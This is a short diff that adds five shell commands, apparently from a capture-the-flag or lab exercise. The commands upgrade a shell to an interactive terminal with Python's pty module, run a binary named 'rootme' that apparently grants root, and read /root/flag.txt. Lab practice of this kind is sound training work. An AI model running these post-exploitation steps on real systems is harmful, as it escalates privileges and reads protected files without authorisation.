@@ -1,0 +1,5 @@
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+/usr/local/bin/rootme
+cd /root
+cat flag.txt
